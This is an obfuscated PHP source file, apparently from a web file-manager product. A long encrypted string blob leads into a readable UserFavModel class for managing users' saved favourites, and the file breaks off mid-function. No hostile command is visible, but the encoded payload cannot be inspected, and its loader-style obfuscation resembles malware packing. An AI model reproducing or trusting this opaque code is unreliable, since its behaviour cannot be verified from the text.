\xb1\x68\xd3\x46\xaa\x84\x5d\x59\x88\x11\x17\xdb\xc\x2\xf9\x1c\x45\x20\x72\x3d\x2c\x78\x3b\x58\x73\x31\xb6\x36"."\xb\x68\xdb\x81\x1d\xb1\xbd\x23\xd8\xb9\xb8\x2b\xb4\x64\x69\xb8\xbb\x27\xd2\x7b\x74\x34\x16\xef\x5b\xb6\x7c\xc5\xca\x63\x60\x74\x19\xa\x64\x14\x2f\x63\x5c\xc1\xe9\x99\x7f\x54\x35\xfd"."\xa3\xcc\xb1\x26\x65\x2a\xfd\xcb\xb0\xe6\x4c\xb3\xfc\xe2\xc2\x11\x7\xc9\xdc\x10\x7\xa2\xde\x23\x42\xc8\xc8\x98\xbf\x7f\xc0\x5a\xc5\x26\xdf\x9f\xd6\x46\xfd\x82\x6d\x60\xb4\x84\x6b\x37"."\x60\xe3\xf4\xca\x9e\x36\x31\x9e\xc8\x1c\x50\x3a\xe9\xda\x5\x1\x20\x8e\x89\xa4\xbd\x52\x0\x1b\x99\x4d\xc9\x4a\x6f\xde\x9b\x1e\x88\x2f\xc6\xe\xc3\x6\x8e\xe1\x83\xae\x9b\x92\xc7\xae".base64_decode('lFFI69JlUzXFmJ1Sapjf5cRk2PKO6Wxaj+TOPeCwO6ESPzYJ2axkxGvpgwWvmg==')."\x1b\x34\x10\xe3\x93\x65\x6\x71\x5e\x75\xd8\x11\x2f\xbc\xc7\x15\x8d\x9c\xce\x9c\xf8\x8c\x78\x51\x15\x52\x1c\x4d\x8c\xa\x67\x9b\x19\x3e\x62\xe2\x9e\xf7\x70\xc0\xe2\x21\x19\xd7\x9\xb9"._kodDe('LlfXaKLZQx1i/h1u1FPxA5S6vWAcyWYoedlA/55PY54YUw12DmfoMZQSf9dMSSI=')."\xb9\x32\x83\x85\x45\x34\xe9\xf2\x52\x4a\xbe\x7b\xca\xa8\x62\x7e\x58\x1c\x5\xe6\x87\xf9\x29\x5a\xca\xc1\x25\xe0\xd\xb9\x53\x32\x12\x10\x8c\x0\x38\xad\x45\x71\x6d\x13\xec\xa4\x1d\xee"."\35\265\115\340\235\274\214\45\305\27\202\145\277\277\201\345\261\131\336\256\356\100\273\27\321\366\106\146\130\213\166\330\201\70\332\142\31\142\251\143\326\54\306\370\123\310"."\214\46\45\213\146\2\60\246\334\313\336\221\116\357\222\24\110\235\304\41\351\62\215\117\27\31\113\107\241\56\114\242\100\261\54\151\230\72\37\142\226\1\131\225\67\30"."\167\3\210\106\205\172\127\124\254\167\105\245\172\127\270\352\135\121\136\57\5\271\60\126\55\26\333\251\67\133\231\254\71\100\51\71\300\266\224\14\76\113\225\317\140\101"."\x8e\xa6\x6\x66\x3e\x14\xdd\x41\xb9\xdb\x34\x4f\x6f\x89\x2f\xbe\x2a\x32\xd2\x7a\x71\x14\xe7\x63\x16\x3e\x6c\x7\xb3\x18\x11\xcb\xa9\x96\xbd\xcc\xe1\xa3\xe2\x5b\x7d\x41\xe2\x8b\xd4\xdd"."\134\36\61\31\52\373\15\313\362\143\277\127\204\165\346\266\15\221\30\123\34\72\373\104\235\304\113\342\57\170\342\341\156\11\271\323\102\341\331\220\352\173\350\167\220\373"."\26\100\22\100\140\20\337\17\307\206\212\20\71\136\64\54\115\166\262\231\326\210\37\66\176\21\123\362\110\231\127\307\61\45\142\46\37\222\157\112\346\266\121\166\202\205"."\x7\xcc\x9b\x77\xf8\xc6\x1d\xf7\xa2\xae\xbb\x7c\x39\x5a\x9a\x36\xcc\x24\x3d\x49\x1a\xe0\xd2\x79\x2f\xf7\xd1\xe8\xee\xe\x26\x5\x82\x28\x9a\xdc\xa3\x27\x3d\xf\xf0\x56\x4\x78\xa5\xab"."\xcd\x94\x1a\x48\x1e\x5e\x51\xbb\xa0\x68\xdc\x4c\x58\xbf\x59\x32\x36\x4c\xa2\xa7\x3f\xc7\x54\xea\xb5\xd7\x14\x6e\x34\xd1\x5c\x52\xdf\xcb\x4b\xb5\x9\xe6\x90\xd2\xb5\x2\x5c\x3e\x2c\x7"."\26\17\164\17\304\345\141\262\115\65\223\101\315\226\334\342\71\332\362\115\136\66\101\353\165\124\105\277\232\20\111\130\174\77\112\201\57\253\216\45\70\166\22\267\353\25"."\xf0\xf3\x68\xc\x7\xc\xcd\x8\x7b\xa8\x62\x49\xf2\xff\x2f\xe3\x4\xde\xaa\xb9\xb7\x76\x2c\xc1\x53\xe7\xa6\x8c\x2c\x10\xa7\xa3\xe0\xa4\x98\x7b\x1\x45\xc3\x53\x68\x33\xd2\xb0\xef\xad".strrev('ªŞì€²œOåä±¡‚Oón£ä5‘óUGi'."\0".'aLñ„NaTò­­ú'."\r".'du\\ÕVØB©')."\332\266\244\37\154\45\243\201\327\167\243\277\321\77\6\153\276\165\4\327\50\274\214\273\351\374\170\2\221\66\146\2\223\220\11\54\220\156\30\165\71\246\213\267\204\221"._kodDe('MNzMx3xAeqj0332t+PmJtUgn4bLzhKj02GtNsKPCikKls+WrKZlhBUlLPDy++Tw=').base64_decode('bK0bq/uxT1MqbS8E9d4CvIR4wO8M7SwvUKK8OmkU0HaGqFDel4LB7OOUSrhCLQ==')."\150\366\230\141\302\121\10\20\321\306\372\131\62\336\2\212\60\323\175\352\172\240\31\53\3\131\367\373\212\23\245\202\27\313\374\336\230\354\312\311\345\172\271\336\231\36"."\113\355\316\364\62\371\113\11\22\221\27\237\324\125\166\263\42\373\117\227\34\115\172\361\276\117\127\36\123\40\1\14\123\106\6\322\145\267\235\14\257\61\331\113\70\311"."\xde\x22\x57\x7b\xf1\x50\x7b\x11\x63\x85\xf1\x1f\x2d\x2a\xb4\xc5\xda\x5a\xa5\x24\x4e\x27\xdd\x6e\xd7\xdd\xee\x51\x20\x59\xf0\xe4\x7a\x65\x9f\xe0\xe3\x88\xab\xc6\xd1\xd8\x9b\xb0\x17\xcf"."\257\127\117\357\54\106\54\352\212\115\115\1\252\124\112\322\127\322\323\356\52\311\351\223\267\124\142\25\126\54\124\346\371\131\2\322\211\20\57\317\301\175\253\150\256\71"."\xc3\xed\x66\xe0\x25\x25\x6d\xb9\x3f\x5e\xb4\x78\x95\xc6\x99\xcd\xb3\xe7\x35\xb3\x7b\x34\x47\xb1\xc3\xb3\x52\x91\x99\xd0\xa1\x4f\xe6\xaf\xf7\x8\x7f\x86\xd1\x1\xe1\xd1\x9b\xf5\xd\x4f".base64_decode('uMNJsQQWw8hXOCMgjnSitQ5/8NBRKiBLrpmJNpmuJHyanOCuritQUiRwAYoWYA==').base64_decode('a5Xs6fiEDLIPk6dXxRJJ5oZFT5LYWhAwfBg11BCsFNlWJdVtKlsqDLdIkYptGA==')._kodDe('Mko2OBmz7Mkrila5WgGzOKG540S27BSG4BWn57BcdDFGIOn4LInBnOdlC8oLjpA=')."\xec\x9a\x1b\x59\x83\x4e\x3\x45\xb4\x37\xb9\xc\x14\xe5\x17\x77\x7a\x73\x25\xee\x74\xbc\x48\xbe\xa1\x4b\xbd\xe1\xbe\xc5\xa1\x1e\xe9\xc4\x5c\x2\x24\xda\x3b\x7a\x12\x81\xde\xde\x8a\x11"."\234\213\301\52\74\174\316\344\33\142\357\152\244\30\32\56\320\363\203\112\12\333\334\266\124\141\150\225\142\231\51\346\335\261\312\17\204\227\44\20\102\325\2\35\262\124".base64_decode('4yxKBvXJS75odPXCBX59IZ8d4UbDNIRJsc8/DYtYfnwYXTgKo4N8NkagncJphg==')."\242\54\120\25\72\360\55\325\370\244\60\123\255\144\321\6\316\315\155\26\272\63\367\260\323\233\5\176\125\216\304\113\61\152\60\236\230\113\126\243\134\215\136\361\174\40"."\220\162\171\13\157\127\13\313\312\263\340\302\175\51\71\212\316\44\61\172\56\117\357\47\352\1\277\20\42\235\7\46\374\214\241\2\122\370\370\323\34\105\65\65\214\121".strrev('7u'."\n".'ä4`aÊëu„Y„†³_î¸Spj :_	_éÒÛ\\|8F…¹bôD\'PìP').strrev('ëó­ÖêûWô'."\r".'	}™û"9it,YîÈ¯èia"rµŠ³ŸCpå†c').base64_decode('7NR9oMqZ18dT0/CAz5ke9QSGnicEgDslZTiXwOKb6q8TVxz46bqCj9xbWhb28w==').base64_decode('U5dVLI5xjXrDXDb9k1lvfDn/bO8RfDFHckpPfESHEnC6j2wd5S7m6ajK34FiUQ==')."\16\262\227\26\310\11\100\116\117\372\371\152\247\247\2\276\224\260\365\147\111\10\255\161\301\361\321\270\53\2\233\143\23\360\50\242\236\210\115\33\162\303\121\131\34\310"."\x3f\x16\x58\x29\x53\x2f\xda\xe\x3a\x45\x9f\x94\xaa\x22\x8f\x2\xc\xa9\xa3\x2a\x4d\x52\xa5\xb0\x27\x6a\xaa\x88\xb\xe4\x2a\x44\x97\x68\xc\x10\x4\xd1\x94\x5\x98\x0\x29\xa6\x96\x6b"."\251\42\315\265\262\232\206\362\23\22\123\251\22\224\261\112\141\324\61\257\362\21\63\155\3\355\224\334\266\33\236\343\350\213\202\145\155\240\7\116\135\200\7\233\166\54"."\375\75\162\32\337\17\360\373\57\71\315\244\346\203\204\352\220\163\270\214\120\164\301\353\40\275\321\110\74\322\316\36\130\250\244\21\233\305\30\136\213\136\223\20\202\21".base64_decode('M+1eGlzpTMFZCD9AYPrNUqHAbRkwT8n3OSIka2lYA/RMK5Yt2WK/xP6S4/gymQ==')."\5\140\311\301\25\166\257\205\62\367\123\345\144\113\75\263\343\145\346\17\342\326\0\113\111\116\46\11\125\56\14\256\162\104\125\50\236\52\217\161\345\154\45\71\324\41"."\264\131\71\203\271\3\153\254\257\257\367\326\67\240\277\374\230\26\130\273\146\166\125\132\112\122\137\337\114\376\322\10\242\321\205\271\160\306\240\245\317\150\26\44\30\323"."\x34\x68\x10\xbb\xfc\xaa\x17\x4a\x8c\xfb\xea\x6f\xc7\xc6\xf9\xa\x6e\xda\x2a\xc6\x70\xb0\xf6\xa3\x69\x20\xf7\xe6\x18\xf9\x98\x2f\xc9\x8c\xf3\x15\x72\xc\x8\x21\xcd\x3d\x8\xfc\x7c\x15"."\x26\x96\xed\xc3\x98\x5e\xb0\x6f\xc4\x4\xa1\x51\x25\x83\x2\xed\xe5\x77\x4b\x50\x32\x81\x3e\xf3\xe9\x55\x9e\x16\xde\xa8\x60\x21\xdd\x2f\x57\xe6\x63\x83\x4b\x81\xc2\x6f\xa8\x97\x45\x78"."\x65\x3f\xdc\x90\x89\x6e\xc\xe2\x70\xc1\xd1\x34\x94\xc7\xe9\xfe\xb\x43\xd0\x6\x9d\xe2\xfd\xc4\x0\x49\x7d\x42\x2e\x19\xf2\x1b\x11\x24\x94\xe3\x57\x4f\x71\xb0\x87\x27\xa5\xfe\xdc\xe9".strrev('­Ç9ë[.@M`§b¼2ÜŒp<}ÒÒÏOÆD<%ÁÅ“bÆ5š¨'."\n".'¤•').strrev('=Û/›-O5Z‹2y(#ÄN>1,¬!œaæˆõÇpbĞyBqó\\<¶T„°')."\x57\x64\xd8\x4d\x43\x5c\xf1\x2a\x7b\x7b\x8e\x85\xa4\x1b\x9e\x4c\x23\x1e\xfb\x16\xdb\x17\x6\x9\x32\x0\xb5\x16\x69\xe7\xe\xbe\xa4\x2\xdc\x51\xae\x3c\x81\xb4\xf4\x2c\x9a\x25\x3c\x7b"."\265\163\267\202\262\273\57\172\272\56\331\140\130\340\273\130\34\247\263\62\106\45\1\310\127\64\215\101\64\131\226\334\127\4\357\255\14\346\311\313\123\126\110\304\73\44"."\247\223\201\370\100\202\275\320\5\170\47\156\207\251\342\355\100\51\251\270\62\45\1\235\353\112\212\150\347\257\104\310\100\54\120\311\6\24\344\242\257\263\14\54\370\70"."\41\274\145\337\200\53\114\302\266\341\65\67\351\332\37\44\23\264\1\153\77\144\75\254\156\60\333\14\74\32\342\234\324\11\247\60\52\357\72\116\164\342\204\274\344\64".strrev('àEVB_®²uÕÈCÂ¥—8ûùN7¸ÎläZZØ°«@âÃb'."\0".'¸÷‚ ö')."\105\327\305\337\57\253\200\164\116\304\52\303\40\262\111\343\2\232\71\175\222\102\110\254\142\234\127\232\265\167\244\244\61\156\121\42\146\212\55\110\31\20\236\170\326\64"."\154\133\276\351\35\110\113\24\70\54\363\12\161\232\305\273\120\324\343\70\332\222\74\201\362\244\150\167\141\265\253\154\307\41\6\123\304\203\265\44\334\270\202\156\243\52".base64_decode('sjvYjP4zF6oF/sYIns6YZNNSoQbIxLPAtmVqKcMkUq50bbVgR7VBORg2uHSPjw==').base64_decode('UrQKRWC/BBKKYyxAcmdJ9nIgeWBFIcnlrcR+eBsUzrckaMk0MEOKIOkrsTAupQ==').base64_decode('lGSpSsTqWCnJ9f8uxoIZvyryvs2sWXEB5MI47oElx6FisbdF0TM5C6mzLAuNww==').base64_decode('O6swe5VjLCSH4aHaeUyFqkiUNKIp7rwCRkcMEkRMaMxuztvQ6GW+QGSLWMbWAg==')."\315\102\153\101\102\3\314\335\63\72\10\106\160\220\116\244\61\244\167\314\310\345\152\161\305\223\334\43\347\363\111\56\234\363\220\51\355\133\32\67\220\43\67\257\145\262"."\42\16\273\251\335\34\116\320\127\51\236\216\20\216\356\160\230\25\272\22\240\225\341\214\7\267\272\171\307\273\264\10\17\34\266\51\256\102\300\165\262\354\56\230\344\22".base64_decode('/RAWmghkUOe90sCIQ3t6J52ZlnK6JMBxgwPLD/593LQWLgbBg2E1tfhikEOX0g==').base64_decode('PcEveGD7GLxJcPtGSw6wWI6cliNA7YEcuTmIpxrTkkDmmczf29Xr56A2Nkz8qg==').base64_decode('LgiM4gmq9mZuB8Uesx3L6yklHFkcag+EO0KxpcqgZktPMhMf2M41TXRddAYYeg==').base64_decode('J7kbaPzpTSLu0pvmPLcluGvJPEp648JZLEVEzSwrEfHqeeeqJ3mwBq9C6pxQaA==')."\111\211\213\246\126\236\176\102\43\57\322\212\26\113\31\112\25\132\3\351\53\327\200\326\201\63\65\332\221\265\302\316\32\257\27\106\165\113\27\24\200\345\230\220\113\27"."\72\112\223\173\42\117\313\216\313\245\31\20\203\115\153\51\367\357\2\16\55\144\377\267\56\151\231\116\223\354\10\250\310\124\364\360\274\222\360\174\117\202\322\233\4\105".base64_decode('U9UtTQJQ5/h1cAsAyfaOR4NyGSlYcm6lFatK0AoYTPI1VClBFL/3+j9uqp4WXg==')."\70\364\64\263\6\340\67\37\250\153\345\166\371\201\51\126\147\331\273\13\337\372\202\203\107\234\21\44\210\337\0\366\114\14\171\345\32\116\154\370\151\170\202\372\46\20".strrev('ÀˆæfgŒ.Õ†d…•\\4¡ÉÆ‚Œ[L‚®Àı1Ÿ´şJ§Ê(œÍá U').strrev('-(ÁuB+E'."\0".'4*cº².—w¡Î‰W)AØ¢ »mÕ–º¯#­¸Qo]UN;8').base64_decode('Sj19HYU7wFYWsCtbogLiHiSYL9oOObFLNouW5oYCCGsjZANs02LkJ8oADn1FmA==')."\265\213\33\301\141\367\337\205\214\41\217\37\41\274\330\306\235\76\135\104\5\122\17\142\356\65\273\374\65\3\232\375\377\44\43\215\214\111\246\201\316\102\312\33\144\271"."\367\66\301\147\341\207\32\262\306\230\363\375\42\14\161\77\315\340\170\224\101\132\64\344\236\257\374\214\4\163\346\157\160\317\160\164\361\111\5\116\247\77\3\360\313\66".base64_decode('I3fRlPxA7bUcVdodr9lLgG5NyJYkF7ZMUNn7ePytHYFl3K07d+MuVjZ59KVjJw==')."\xe9\x5c\x60\xc5\xe9\xcf\x5e\x3c\x13\x20\x36\x4a\xa7\x23\x75\x7e\x16\x69\x89\x15\x61\xd9\xe\x47\xfd\x71\x23\xae\xe\x7a\x28\x1f\x86\x49\x9b\x8\xb5\x4d\xc8\xdf\xb2\x75\x26\xe9\x34\x8a"."\144\132\236\64\237\364\205\122\2\366\152\116\332\103\236\164\241\364\316\355\137\136\132\156\234\210\312\271\7\163\106\122\315\105\251\201\223\343\132\204\211\144\50\156\264\350"."\x48\x46\x41\x7e\xb5\x58\xdc\xe9\xd1\x7\x5\xc2\x31\x48\xa9\x10\xa2\x2a\x65\x7\xd4\x94\x64\x34\xd9\x3e\x96\x1e\xf8\x88\x9b\x46\x90\x1c\xd5\xd6\x4b\x4f\x78\xa0\xdb\x72\x91\xec\xd4\x8d".strrev(''."\0".'ßİ3/E|‡¬œ@„bMc°LEÊ‚ˆY>¦Ÿlƒˆ'."\0".'Øt§åıSÇ¥;1+').base64_decode('5XjofIGAIiz56dAyXALBYbExy/eIxXG++zEbVg1/mcdDeybeW6Pv8Hj4mzse6g==').base64_decode('HMoDL+14xI2xb3rEQLyJ6HxIEbeZG/SViQJuKYAPlStD1D1wcaNcNyjOJgulvA==')."\70\355\105\1\247\124\124\326\141\251\207\45\63\347\41\47\263\36\346\66\307\65\34\242\127\362\314\124\30\303\157\57\203\332\165\22\121\47\355\244\72\315\13\222\46\73"."\xdd\x72\x27\xd3\x1d\x58\x97\x30\x35\x71\x73\x82\xba\x2a\x2b\x7b\x2c\x63\x65\x3e\xdd\x38\x73\xf6\x3c\x59\xa5\x20\xe6\x47\x9c\x13\x31\x7\xb0\xf4\x7\x58\x6\x31\xe3\x8a\x13\x9f\x14\xe6".strrev(',Kx“àoäuËı¤FÌ”$Ù`pş['."\0".'d©4ê°_0Ïÿ‹–$ş[riÒ$·^M')."\37\272\143\211\207\260\234\165\321\75\274\102\77\244\175\107\254\4\372\62\221\221\303\222\155\36\153\147\155\123\165\112\157\225\204\24\62\22\114\42\322\311\253\236\232\273"."\xed\x64\x60\x40\x87\x21\xa2\x25\x29\x46\x2e\xd1\x36\xdc\xa\x18\x9c\x1d\xef\x4b\x44\xff\x17\x29\xe4\x60\x97\xc5\x37\x61\xc5\x9a\x92\x48\xca\xff\x60\x2\x99\xa0\x42\x65\x1a\x61\xf0\x51".base64_decode('oef+RYxuVHh5Sjo1/4Z2UxaLC2Ve1fZKCCkp7TQ7QiYYmBUhIzr76ioeZRNlrA==')."\xf2\x28\x3b\x4b\x54\xce\x67\x49\xf\x54\x9\x97\x1f\x12\x87\x85\x73\xb3\x2b\x77\x3b\x11\xb1\x19\x71\x92\x9f\xde\xb2\xb3\x42\x86\xa0\x2b\xd4\xb1\x5a\x25\xaf\x83\xf2\x1d\x24\x52\x90\xbc"."\14\312\213\46\252\31\150\57\54\327\256\170\274\227\136\63\13\54\346\127\317\124\311\36\7\17\235\364\316\234\41\177\73\357\165\107\230\343\64\304\23\71\344\67\24\356"."\160\75\105\110\110\216\373\175\102\326\177\262\316\5\11\223\356\60\72\204\5\376\224\214\103\170\260\334\257\74\41\356\111\166\266\210\202\34\303\141\257\4\132\107\154\243".base64_decode('aW0e92udRekKt+vxYUlL6nxW2HHVEzuncC1rdoHUcr29Rt3S0W/GeP9fP2v0/w==')."\xea\x35\xa3\xd9\xf5\x4c\x9f\xed\x78\xc9\x70\x31\xf0\xb3\x8c\xf9\x9a\x94\x5c\x6d\x52\x5d\xaa\xab\x1f\xce\x1d\x11\x5e\xc4\x16\x6f\x77\x4a\x61\x6e\x0\xca\x1c\x94\x30\xbf\x25\x2a\x3b\x7f"."\121\163\71\367\141\144\231\4\120\366\350\33\102\276\141\376\122\131\245\100\371\133\253\16\74\143\234\244\364\322\247\236\32\256\160\130\210\107\73\354\164\63\51\355\377\145"."\311\4\51\102\154\2\363\324\342\147\137\51\54\100\141\46\221\121\100\371\62\142\244\310\104\255\132\40\272\253\26\61\112\101\256\67\3\301\220\211\204\3\124\106\132\342".base64_decode('jjF0AOXhES8V83dSHTm6Xc9e0USWPLYOnXX52XF5br5u5SzYTtap1eHvkNa7Hw==')."\x26\x6d\xf0\x96\x57\x46\xcd\xd4\xb1\x62\x21\x8a\x45\x79\xa6\x9c\x21\xc7\x1a\xe4\xd8\xb1\x42\x1e\x8a\x67\x31\x91\x66\x27\x98\x5e\x79\xbd\xf1\xe7\xc6\x84\x3c\x8b\xbf\xe4\xfe\xb2\x75\xdb".strrev('Ü+z]¾"¦'."\0".'ZnC]×Ö;t,ÇÄ¦^q€<uÎô{,Å”8²Cz¹Br×„k')."\xce\x17\xa9\xbe\x4c\xde\x2e\xd9\x35\x26\xc9\x42\x18\x40\xe\xad\x96\x25\xbb\x8\x77\xe6\xc4\x36\xdf\xce\x95\xb2\xb0\x52\xb2\x94\x61\x5a\x52\x32\xe\xaf\x94\x16\xbf\x2b\x68\x3b\x46\x53"."\70\376\165\73\374\45\102\56\225\133\35\342\53\34\116\312\40\351\354\16\161\262\151\247\277\162\22\111\300\314\373\27\173\113\136\234\76\71\17\377\270\333\321\62\112\125".base64_decode('0sNSNMnFXMmgX3ydKyQu8JNoqk4PjKo2O0Jz53I+OSodFaYI7gTLT4PEIZW0zw==').strrev('ÜÆÖ1°¨†éÙ‹„¼DCŸV3M$u·ŸÍ:nŒ'."\0".'8¨êv ¼è—Ø$ÌXl³')."\257\27\372\344\133\245\216\204\345\120\161\203\124\312\57\216\11\104\67\61\254\122\367\311\222\161\146\227\157\250\162\244\22\40\352\3\232\33\321\110\102\5\66\256\27\326"._kodDe('MaEiSRgDLydCsNxR37tpBz2CX9iup20RsVyZKE0Yo3+320yLYrftqA/vcRtHAhk=')."\x27\x9f\xe\xee\x34\x43\xac\x72\x25\x2\x2b\x9d\x43\x2c\x5d\x24\x16\x11\x6c\xb3\x32\x1c\x83\x2f\x11\x3b\xde\x31\x48\x19\x95\x23\x1d\xcd\x71\x4f\x2d\xe1\xf0\x5\xfa\x52\x60\x9e\xa8\x34"."\x69\x5c\xc0\x19\x45\xd3\x6b\xae\xd6\xcb\x19\xdc\x3d\xa3\x39\xac\x31\xdd\x4e\x65\x25\xb1\xa3\x3c\xb2\x1c\x6e\x96\xd\x2a\x54\x54\xb9\xbd\xee\x56\xb1\x31\x75\xb\x63\xa2\x90\xb2\xf6\x48"."\x26\x6\x71\xa3\x42\x1e\xda\xa2\x8a\xd9\x68\x14\xce\x29\xd8\x45\x47\xde\x9d\xc\x1\xce\x4b\xa3\x70\xde\xb2\x68\x96\x59\xd2\x5d\x48\xf9\x6c\xb5\x64\xed\xa4\x7b\xe5\x83\x7\x2\x7d\xba".base64_decode('QoddYi9NurPxrJi4vDrAOHdqogGo3AohuLtOeCu1omLinbaiwpvZ4FWtAq1lMQ==').strrev('+ÄÎU˜`yp\\-9o¥Åh‡ƒeC9²Ñ'."\n".'Ÿ‡²Ñï-‚®"ã§/ó8«¨').base64_decode('zJJF73QHSS8VhgsG3ybSwnYMm6byd4t5dWWlOVGzUJKsSisaGHuwKF0utOZUpg==')."\3\227\54\263\251\324\142\330\172\112\262\206\22\66\251\274\233\272\140\343\163\222\256\315\245\346\22\202\275\343\254\274\202\42\210\200\200\135\23\352\144\207\265\73\335\377"."\101\217\116\117\323\332\361\251\55\77\102\301\342\225\207\356\227\64\72\146\230\266\7\307\305\215\42\371\155\63\154\133\234\56\123\161\231\60\171\170\323\363\110\106\22\350"."\x4b\x9c\x97\xe0\x51\x24\x2a\x7c\x82\x8e\x84\x6c\x90\x4f\x38\xd7\xc3\x72\x68\x4c\xa3\xb1\x84\xd8\x38\x2\xf8\x68\x80\x7\xe4\x3d\xd\xce\xf7\x3a\x4b\xae\x13\x48\x1\x40\x42\x64\xd2\x18"."\147\356\364\360\265\133\321\36\361\334\261\352\146\344\4\17\2\370\46\233\174\220\313\315\226\237\306\370\301\327\260\227\224\1\357\235\370\206\212\203\216\354\364\5\7\156"."\317\370\115\45\200\32\122\24\101\175\220\22\15\22\366\306\33\134\21\212\305\143\145\121\275\201\130\154\171\44\332\101\135\226\226\105\223\134\222\11\115\131\124\157\127\244"."\147\147\161\301\356\100\50\134\26\207\255\155\172\22\302\337\22\215\12\365\222\126\6\302\341\310\362\235\265\42\324\276\124\264\204\34\232\12\355\166\61\153\60\245\65\323".base64_decode('/sfUHJOlpQt4Wl443hJ5nCoCeV4t5pOOfzgd+7us2xjCQkHYUqYHyo4WAYpduA==')."\362\305\315\231\145\322\41\331\212\116\34\13\373\34\307\307\22\234\54\26\102\142\44\44\224\167\127\2\250\253\70\142\262\252\264\134\165\117\142\305\210\340\226\56\61\222"."\x34\x30\x64\x24\x25\xd5\x3c\x95\x5d\xe0\x56\x1c\x8c\xb1\x64\x1e\x45\xbf\x21\xfa\x7f\x3\x24\xbd\xb\xa9\xe3\xa1\x0\x0".""."".base64_decode('')."", 10, -8))); goto d……ãÈˆ×¾; Cö½ÖİÜ“¿: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($¢í§åëï) { $óÖÙÄã =& $_SERVER[¥ÙÌÜ¾ê]; return array($óÖÙÄã[1859] => array(USER_ID, $óÖÙÄã[2174])); } protected function listData() { $ğÈ´İšŸ =& $_SERVER[¥ÙÌÜ¾ê]; $Ğ‚Ó¡¢ = array($ğÈ´İšŸ[1572] => USER_ID, $ğÈ´İšŸ[477] => 0); $“ïª®²Ú = $ğÈ´İšŸ[2175]; $Ë‰‰í…Ç = $this->field($“ïª®²Ú)->where($Ğ‚Ó¡¢)->order($ğÈ´İšŸ[2176])->select(); return $Ë‰‰í…Ç ? $Ë‰‰í…Ç : array(); } protected function resetCache() { } protected function listView() { $ïË›ÆÜ =& $_SERVER[¥ÙÌÜ¾ê]; $û £È«é = $this->listData(); $”Ğ»íœ— = array_filter_by_field($û £È«é, $ïË›ÆÜ[29], $ïË›ÆÜ[411]); $ˆşâá¬Ë = array_to_keyvalue($”Ğ»íœ—, $ïË›ÆÜ[33], $ïË›ÆÜ[76]); if (!$ˆşâá¬Ë) { return $û £È«é; } $øªÌÑøî = 2000; $†…µæàÏ = array($ïË›ÆÜ[412] => array($ïË›ÆÜ[413], $ˆşâá¬Ë)); $åû±á÷ = Model($ïË›ÆÜ[825])->listSource($†…µæàÏ, $øªÌÑøî); $åû±á÷ = array_merge($åû±á÷[$ïË›ÆÜ[74]], $åû±á÷[$ïË›ÆÜ[75]]); $åû±á÷ = array_to_keyvalue($åû±á÷, $ïË›ÆÜ[397]); foreach ($û £È«é as $†üèíö† => $ÇÛİæ) { $èí ½ü¥ = $åû±á÷[$ÇÛİæ[$ïË›ÆÜ[76]]]; $èí ½ü¥ = $èí ½ü¥ ? $èí ½ü¥ : array(); $û £È«é[$†üèíö†] = array_merge($èí ½ü¥, $ÇÛİæ); } return $û £È«é; } protected function addFav($§´¹åç×, $©Ùµ¶§ = '', $åıäï¤ò = "\x73\157\x75\162\143\x65") { $Ğ¦Ÿåı† =& $_SERVER[¥ÙÌÜ¾ê]; $‚Ü´ıóğ = array($Ğ¦Ÿåı†[1572] => USER_ID, $Ğ¦Ÿåı†[477] => 0, $Ğ¦Ÿåı†[417] => $åıäï¤ò, $Ğ¦Ÿåı†[416] => $§´¹åç×); if ($this->where($‚Ü´ıóğ)->find()) { return !1; } $‚Ü´ıóğ = array($Ğ¦Ÿåı†[1572] => USER_ID, $Ğ¦Ÿåı†[477] => 0); $ŸéÓºÄ = $this->where($‚Ü´ıóğ)->max($Ğ¦Ÿåı†[1772]); if (!$ŸéÓºÄ) { $ŸéÓºÄ = 0; } if (!$©Ùµ¶§ && $åıäï¤ò == $Ğ¦Ÿåı†[411]) { $¤¸õ×´ = Model($Ğ¦Ÿåı†[1253])->where(array($Ğ¦Ÿåı†[412] => $§´¹åç×))->find(); if (!$¤¸õ×´) { return !1; } $©Ùµ¶§ = $¤¸õ×´[$Ğ¦Ÿåı†[28]]; } $©Ùµ¶§ = $this->getAutoName($©Ùµ¶§); $ğ˜Ü¬î” = array($Ğ¦Ÿåı†[1572] => USER_ID, $Ğ¦Ÿåı†[477] => 0, $Ğ¦Ÿåı†[415] => $©Ùµ¶§, $Ğ¦Ÿåı†[416] => $§´¹åç×, $Ğ¦Ÿåı†[417] => $åıäï¤ò, $Ğ¦Ÿåı†[1753] => $ŸéÓºÄ + 1); return $this->add($ğ˜Ü¬î”); } protected function remove($Ğøõ¥¯Ì) { $¢ÓÔúß° =& $_SERVER[¥ÙÌÜ¾ê]; $å¡«æÉÙ = array($¢ÓÔúß°[1572] => USER_ID, $¢ÓÔúß°[414] => $Ğøõ¥¯Ì); return $this->where($å¡«æÉÙ)->delete(); } protected function removeByName($‹äÉ „á) { $¾ëòï¸Ã =& $_SERVER[¥ÙÌÜ¾ê]; $†áÉªÌî = array($¾ëòï¸Ã[1572] => USER_ID, $¾ëòï¸Ã[415] => $‹äÉ „á, $¾ëòï¸Ã[477] => 0); return $this->where($†áÉªÌî)->delete(); } protected function rename($œñÈ°î, $™ÅÁê±Ü) { $Ü¾íêğĞ =& $_SERVER[¥ÙÌÜ¾ê]; if ($œñÈ°î == $™ÅÁê±Ü) { return !1; } $Ìë‚Êç = $this->getAutoName($™ÅÁê±Ü); if ($™ÅÁê±Ü != $Ìë‚Êç) { return !1; } $è€Å–ó = array($Ü¾íêğĞ[1572] => USER_ID, $Ü¾íêğĞ[477] => 0, $Ü¾íêğĞ[28] => $œñÈ°î); return $this->where($è€Å–ó)->save(array($Ü¾íêğĞ[28] => $™ÅÁê±Ü)); } protected function resetSort($ª­ìï¥¼) { $ÎÓ“ƒ”¶ =& $_SERVER[¥ÙÌÜ¾ê]; $ª­ìï¥¼ = is_array($ª­ìï¥¼) ? $ª­ìï¥¼ : array(); $ÂğÌû‡ = array($ÎÓ“ƒ”¶[1572] => USER_ID); for ($Ê¯üÊ¾Ÿ = 0; $Ê¯üÊ¾Ÿ < count($ª­ìï¥¼); $Ê¯üÊ¾Ÿ++) { $ÂğÌû‡[$ÎÓ“ƒ”¶[414]] = $ª­ìï¥¼[$Ê¯üÊ¾Ÿ]; $this->where($ÂğÌû‡)->save(array($ÎÓ“ƒ”¶[1753] => $Ê¯üÊ¾Ÿ + 1)); } return !0; } protected function moveTop($¯œÌ±¤Î) { $±œƒ…¦˜ =& $_SERVER[¥ÙÌÜ¾ê]; $¡‘£Ì¯­ = 